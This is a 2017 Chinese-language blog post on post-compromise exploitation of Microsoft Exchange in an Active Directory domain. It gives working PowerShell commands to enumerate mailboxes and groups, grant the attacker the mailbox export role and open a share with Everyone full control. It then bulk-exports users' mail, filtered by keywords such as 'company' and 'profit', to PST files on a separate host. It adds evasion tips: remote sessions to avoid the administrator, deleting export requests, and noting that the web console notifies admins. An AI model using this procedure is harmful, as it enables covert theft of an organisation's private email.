<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>域渗透之Exchange Server | ru0</title><meta name="description" content="域渗透之Exchange Server - ruo"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="ru0"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="ru0"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="/hmind" target="_self">HACKMIND</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/ru0" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">域渗透之Exchange Server</h1><div class="post-info"><a></a>2017-07-27</div><div class="post-content"><p><img src="https://i-technet.sec.s-msft.com/Areas/Epx/Themes/TechNet/Content/Images/BrandLogoExchange.png?v=636437933426396895" alt=""></p>
<blockquote>
<p>Microsoft Exchange Server 做为消息与协作系统。它提供了业界最强的扩展性、高可靠性、安全性和高处理性能，被许多企业、学校、政府等作为主要邮件系统。在内网渗透测试中，对邮件系统的把控会让你事半功倍，尤其是和AD绑在一起的Exchange。</p>
</blockquote>
<p>通过本文你将了解Ps下对Exchange邮件的基本操作，这也同样适用于运维管理，当然相比博大精深的ES是远远不够的。以下环境为Exchange server 2013，也同样适用于2010等版本。</p>
<p>你可以在开始菜单中通过 Exchange Management Shell （EMS）管理器快捷方式连接到 exchange server，初始化过后你将得到一个Powershell命令窗口。如果连接失败，请相信我，一定是你内存分配的不够，默认安装的Exchange也至少需要分配6个G内存。</p>
<p>如果一切都没有问题，并且你已经获取了域控权限，那就开始我们的旅程吧！</p>
<h2 id="导出邮箱列表"><a href="#导出邮箱列表" class="headerlink" title="导出邮箱列表"></a>导出邮箱列表</h2><h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><p>邮箱数据库是创建和存储邮箱的粒度的单位。邮箱数据库以 Exchange 数据库 (.edb) 文件的形式存储。存储结构分为直接附加存储 (DAS)和存储区域网络 (SAN)。我们可以通过 Get-MailboxDatabase cmdlet 从服务器或组织中检索一个或多个邮箱数据库对象。一般为了高可用性至少有两台服务器组成DGA，你可以通过-Server参数指定检索服务器。</p>
<pre><code>[PS] C:\Windows\system32&gt;get-mailboxdatabase -Server &quot;exchange&quot;

Name                           Server          Recovery        ReplicationType
----                           ------          --------        ---------------
Mailbox Database 0574336487    EXCHANGE        False           None
Mailbox Database Test01        EXCHANGE        False           None
</code></pre><p>格式化筛选指定属性，如数据库文件路径</p>
<pre><code>[PS] C:\&gt;Get-MailboxDatabase -Identity &apos;Mailbox Database Test01&apos; |  Format-List Name,EdbFilePath,LogFolderPath

Name          : Mailbox Database Test01
EdbFilePath   : C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database Test01\Mailbox Database Test01.edb
LogFolderPath : C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database Test01
</code></pre><p>ECP数据库管理位置</p>
<p><img src="http://i.imgur.com/JT1pMQf.png" alt=""></p>
<h4 id="获取组"><a href="#获取组" class="headerlink" title="获取组"></a>获取组</h4><p>在域控中新建过OU（Organizational Unit）之后，我们往往会建立Group来管理用户。查询组的意义在于——往往你会看到有个组名字叫做IT，当然这一步和net group大同小异。通过Get-DistributionGroup cmdlet 查询现有通讯组。</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-DistributionGroup

Name                          DisplayName                   GroupType                     PrimarySmtpAddress
----                          -----------                   ---------                     ------------------
EXchange New OU               EXchange New OU               Universal                     ENO@ruos.org
IT Security                   IT Security                   Universal, SecurityEnabled    it-security@ruos.org
</code></pre><p>查看通讯组IT Security详细信息</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-DistributionGroup &quot;IT Security&quot; | fl


RunspaceId                             : efbb60f9-5ef1-4a8d-9b94-c3f102e576c3
GroupType                              : Universal, SecurityEnabled
SamAccountName                         : IT Security
BypassNestedModerationEnabled          : False
ManagedBy                              : {ruos.org/Users/Administrator, ruos.org/Users/admin}
MemberJoinRestriction                  : Closed
MemberDepartRestriction                : Closed
...
</code></pre><p>导出成CSV文件</p>
<pre><code># 查询通讯组
Get-DistributionGroup | `
Select-Object DisplayName,Name,Alias,GroupType,WindowsEmailAddress,@{n=&quot;ManagedBy&quot;;e={$_.ManagedBy -Join &quot;;&quot;}} ,OrganizationalUnit | `
Export-CSV test.csv -NoType
</code></pre><h4 id="获得组成员"><a href="#获得组成员" class="headerlink" title="获得组成员"></a>获得组成员</h4><p>通过Get-DistributionGroupMember cmdlet 可以查找现有的通讯组成员。</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-DistributionGroupMember -Identity &quot;ENO&quot;

Name                                                        RecipientType
----                                                        -------------
Administrator                                               UserMailbox
a                                                           UserMailbox
ming xiao                                                   UserMailbox
user1                                                       UserMailbox
</code></pre><h4 id="获得用户admin（可以是域用户格式）邮箱信息"><a href="#获得用户admin（可以是域用户格式）邮箱信息" class="headerlink" title="获得用户admin（可以是域用户格式）邮箱信息"></a>获得用户admin（可以是域用户格式）邮箱信息</h4><p>获取用户邮箱信息。通过以上步骤，我们大概知道了如何查询用户组中的成员，下面我们将使用Get-Mailbox cmdlet 获取邮箱对象和属性。再配合Get-MailboxStatistics cmdlet 获取有关邮箱的信息，例如，邮箱大小、所包含的邮件数、以及最后访问时间。</p>
<p>基本使用<br>Get-Mailbox | format-tables Name,WindowsEmailAddress<br>Get-Mailbox testuser | fl * | Out-File c:\mb.txt<br>Get-Mailbox | ForEach-Object {$_.Name}</p>
<p>获取组织单元内用户<br>Get-Mailbox -OrganizationalUnit “New OU” </p>
<pre><code>[PS] C:\Windows\system32&gt;get-mailboxstatistics -identity admin | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime

DisplayName                                       ItemCount TotalItemSize                 LastLogonTime
-----------                                       --------- -------------                 -------------
admin                                                    11 90.88 KB (93,056 bytes)       2016/11/29 19:59:08
</code></pre><p>Format-Table 模式查看</p>
<blockquote>
<p>使用反引号`换行，输入结束后再回车执行。</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 查看所有邮箱信息</span></div><div class="line">Get-Mailbox -ResultSize Unlimited | `</div><div class="line">Get-MailboxStatistics | `</div><div class="line"><span class="built_in">Sort-Object</span> TotalItemSize –Descending | `</div><div class="line">ft DisplayName,@&#123;label=<span class="string">"Mailbox Size (MB)"</span>;expression=&#123;<span class="variable">$_</span>.TotalItemSize.Value.ToMB()&#125;</div></pre></td></tr></table></figure>
<p>导出到CSV文件（这将是你想要的）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mb</span> = Get-Mailbox -ResultSize Unlimited</div><div class="line"><span class="variable">$output</span> = <span class="keyword">foreach</span>(<span class="variable">$obj</span> <span class="keyword">in</span>  <span class="variable">$mb</span> )&#123;</div><div class="line">    <span class="variable">$ms</span> = (Get-MailboxStatistics <span class="variable">$obj</span>.Identity -WarningAction SilentlyContinue )</div><div class="line">	<span class="variable">$obj</span> | <span class="built_in">Select-Object</span> DisplayName,Name,WindowsEmailAddress,OrganizationalUnit,Database,`</div><div class="line">	@&#123;L=<span class="string">"Mailbox Size (MB)"</span>;E=&#123; <span class="variable">$ms</span>.TotalItemSize.Value.ToMB() &#125;&#125;,`</div><div class="line">	@&#123;L=<span class="string">"LastLogonTime"</span>;E=&#123; <span class="variable">$ms</span>.LastLogonTime &#125;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#Write-Output $output </span></div><div class="line"><span class="variable">$output</span> | <span class="built_in">Export-CSV</span> test.csv -NoType</div></pre></td></tr></table></figure>
<p>或者通过ECP导出</p>
<p><img src="http://i.imgur.com/N1mmgDy.jpg" alt=""></p>
<h2 id="导出PST邮件"><a href="#导出PST邮件" class="headerlink" title="导出PST邮件"></a>导出PST邮件</h2><p>在了解了用户的邮箱使用情况后，我们下一步将邮箱数据导出为PST文件，以方便本地查看和搜索。<br><strong>要在Exchange Server 2010 SP1中使用用户邮箱导出功能，只能使用EMS进行操作。而且操作的Exchange服务器管理员必须要成为“邮箱导入导出角色”。</strong></p>
<blockquote>
<p>Exchange Server 2007 可以使用 export-Mailbox cmdlet </p>
</blockquote>
<p>导出邮件分为以下几个步骤:</p>
<ul>
<li>Step1 为用户添加导出权限</li>
<li>Step2 导出邮件</li>
<li>Step3 查看导出请求及删除导出请求</li>
</ul>
<h4 id="查看角色（默认只有组织管理成员才有导入-导出权限）"><a href="#查看角色（默认只有组织管理成员才有导入-导出权限）" class="headerlink" title="查看角色（默认只有组织管理成员才有导入/导出权限）"></a>查看角色（默认只有组织管理成员才有导入/导出权限）</h4><p>使用Get-ManagementRole cmdlet 查看组织内已创建的管理角色。</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-ManagementRole

Name                                                        RoleType
----                                                        --------
Mailbox Import Export                                       MailboxImportExport
</code></pre><p>Get-ManagementRoleAssignment cmdlet 检索管理角色分配。</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName

RoleAssigneeName : Organization Management

RoleAssigneeName : Administrator

RoleAssigneeName : admin
</code></pre><h4 id="为用户Administrator添加邮箱导入导出角色"><a href="#为用户Administrator添加邮箱导入导出角色" class="headerlink" title="为用户Administrator添加邮箱导入导出角色"></a>为用户Administrator添加邮箱导入导出角色</h4><p>New-ManagementRoleAssignment cmdlet 可以将管理角色分配给管理角色组、管理角色分配策略、用户或通用安全组 (USG)。</p>
<blockquote>
<p>添加角色后需要重启EMS</p>
</blockquote>
<pre><code>[PS] C:\Windows\system32&gt;New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot;  `
&gt;&gt;-User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;
&gt;&gt;

DataObject                   : Import Export_Domain Admins
User                         : ruos.org/Users/Administrator
AssignmentMethod             : Direct
Identity                     : Import Export_Domain Admins
EffectiveUserName            : Administrator
</code></pre><p>删除管理角色分配</p>
<pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false
</code></pre><h4 id="New-MailboxExportRequest-cmdlet-将主邮箱或存档的内容导出到-pst-文件。"><a href="#New-MailboxExportRequest-cmdlet-将主邮箱或存档的内容导出到-pst-文件。" class="headerlink" title="New-MailboxExportRequest cmdlet 将主邮箱或存档的内容导出到 .pst 文件。"></a>New-MailboxExportRequest cmdlet 将主邮箱或存档的内容导出到 .pst 文件。</h4><p>net share 创建“读/写权限”共享文件夹</p>
<p>net share sharename$=c:\share /GRANT:Everyone,FULL</p>
<p>将user1收件箱中的所有邮件导出到 .pst  </p>
<p>New-MailboxExportRequest -Mailbox user1 -IncludeFolders “#Inbox#” -FilePath \10.2.2.163\maildata\user1.pst</p>
<blockquote>
<p>Inbox（收件箱）、SentItems（已发送邮件）、DeletedItems（已删除邮件）、Drafts（草稿）</p>
</blockquote>
<p>导出用户 Tony 在 2012 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">New-MailboxExportRequest -Mailbox Tony `</div><div class="line">-ContentFilter &#123;(body <span class="nomarkup">-like</span> <span class="string">"*company*"</span>) `</div><div class="line">-and (body <span class="nomarkup">-like</span> <span class="string">"*profit*"</span>) `</div><div class="line">-and (Received <span class="nomarkup">-lt</span> <span class="string">"01/01/2012"</span>)&#125; `</div><div class="line">-FilePath <span class="string">"\\SERVER01\PSTFileShare\Tony_CompanyProfits.pst"</span></div></pre></td></tr></table></figure>
<p>之后你可以将其载入到Outlook中进行查看。</p>
<h4 id="查看导出请求状态"><a href="#查看导出请求状态" class="headerlink" title="查看导出请求状态"></a>查看导出请求状态</h4><p>Get-MailboxExportRequest cmdlet 可以查看使用 New-MailboxExportRequest cmdlet 启动的正在执行的导出请求的详细状态。</p>
<pre><code>[PS] C:\Windows\system32&gt;Get-MailboxExportRequest

Name                                           Mailbox                                        Status
----                                           -------                                        ------
MailboxExport                                  ruos.org/Users/a                               Completed
</code></pre><h4 id="删除全部或部分完成的导出请求"><a href="#删除全部或部分完成的导出请求" class="headerlink" title="删除全部或部分完成的导出请求"></a>删除全部或部分完成的导出请求</h4><pre><code>[PS] C:\Windows\system32&gt;Remove-MailboxExportRequest -Identity &quot;a\MailboxExport&quot;
</code></pre><p>删除所有状态为“已完成”的导出请求</p>
<pre><code>Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false
</code></pre><p>或者通过ECP导出，缺点是不能过滤时间，并且管理员会收到导出完成通知。</p>
<p><img src="http://i.imgur.com/L24RI8O.jpg" alt=""></p>
<p>以上介绍了如何通过EMS导出用户邮件，但是谁也不能保证你不会和管理员撞个满怀。值得庆幸的是，Exchange Server支持PowerShell远程操作。</p>
<h2 id="Exchange-PowerShell"><a href="#Exchange-PowerShell" class="headerlink" title="Exchange PowerShell"></a>Exchange PowerShell</h2><p>远程 PowerShell 提供了从命令行管理 Exchange Online的方式，利人又利己。</p>
<h4 id="创建用户凭证"><a href="#创建用户凭证" class="headerlink" title="创建用户凭证"></a>创建用户凭证</h4><pre><code>$Credential = Get-Credential
</code></pre><p>但这样会弹出凭据请求输入框，使用 PSCredential 创建非交互式登陆凭据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"PlainTextPassword"</span> -AsPlainText -Force</div><div class="line"><span class="variable">$Credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="string">"Domain01\User01"</span>, <span class="variable">$pass</span>)</div></pre></td></tr></table></figure>
<h4 id="创建登陆会话"><a href="#创建登陆会话" class="headerlink" title="创建登陆会话"></a>创建登陆会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> -ConfigurationName Microsoft.Exchange `</div><div class="line">-ConnectionUri http://&lt;FQDN of Exchange <span class="number">2016</span> Mailbox server&gt;/PowerShell/ `</div><div class="line">-Authentication Kerberos -Credential <span class="variable">$Credential</span></div></pre></td></tr></table></figure>
<h4 id="导入会话"><a href="#导入会话" class="headerlink" title="导入会话"></a>导入会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$Session</span></div></pre></td></tr></table></figure>
<h4 id="移除会话"><a href="#移除会话" class="headerlink" title="移除会话"></a>移除会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Remove-PSSession</span> <span class="variable">$Session</span></div></pre></td></tr></table></figure>
<h2 id="Scripting-with-the-Exchange-Management-Shell"><a href="#Scripting-with-the-Exchange-Management-Shell" class="headerlink" title="Scripting with the Exchange Management Shell"></a>Scripting with the Exchange Management Shell</h2><p>通过SHELL的方式执行脚本。<br>适用于： Exchange Server 2013</p>
<p>exchange默认根目录在  <root drive="">:\Program Files\Microsoft\Exchange Server\V15\bin</root></p>
<h4 id="执行自定义脚本"><a href="#执行自定义脚本" class="headerlink" title="执行自定义脚本"></a>执行自定义脚本</h4><p>需要开启远程脚本执行权限</p>
<pre><code>Set-ExecutionPolicy RemoteSigned
</code></pre><p>Script</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># filename:test.ps1</span></div><div class="line"><span class="comment"># export to pst</span></div><div class="line"><span class="keyword">foreach</span>(<span class="variable">$user</span> <span class="keyword">in</span> <span class="string">"admin"</span>,<span class="string">"user1"</span>,<span class="string">"user2"</span>)&#123;</div><div class="line">    New-MailboxExportRequest -Mailbox <span class="variable">$user</span> -ContentFilter &#123; Received <span class="nomarkup">-gt</span> <span class="string">"11/29/2016"</span> &#125; -FilePath <span class="string">"\\192.168.6.2\sharename<span class="variable">$\$</span>user.pst"</span></div><div class="line">    <span class="built_in">Start-Sleep</span> -Seconds <span class="number">3</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从cmd启动脚本</p>
<blockquote>
<p>64位系统下存在文件系统重定向机制，powershell路径为 C:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe</p>
</blockquote>
<pre><code>PowerShell.exe -command &quot;. &apos;C:\Program Files\Microsoft\Exchange Server\V15\bin\RemoteExchange.ps1&apos;; Connect-ExchangeServer -auto; C:\test.ps1&quot;
</code></pre><p>or </p>
<p>查看角色权限</p>
<pre><code>PowerShell.exe -command &quot;. &apos;C:\Program Files\Microsoft\Exchange Server\V15\bin\RemoteExchange.ps1&apos;; Connect-ExchangeServer -auto; Get-ManagementRoleAssignment -role \&quot;Mailbox Import Export\&quot;&quot;
</code></pre><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>Exchange和AD的紧密性使得很多Cmdlet Reference都能达到同样的目的，比如查询用户登陆的源IP地址，我们还能通过Exchange的IIS日志来查找。但有时候遗憾的是，用户虽然在使用邮箱，工作机却没有加入域中。这种情况我们就需要配合其他信息进一步确认。</p>
<p><img src="http://i.imgur.com/f0rIlU4.png" alt=""></p>
<p>参考资料</p>
<p><a href="https://technet.microsoft.com/zh-cn/library/mt587043(v=exchg.150).aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/mt587043(v=exchg.150).aspx</a><br><a href="https://technet.microsoft.com/zh-cn/library/bb124558(v=exchg.150).aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/bb124558(v=exchg.150).aspx</a><br>Microsoft Exchange Server 2013 PowerShell Cookbook</p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2017/11/01/SPNs/">prev</a><a class="next" href="/2017/02/08/WMI/">next</a></div><div class="copyright"><p>&copy; 2017 <a href="http://ruos.org">ruo</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>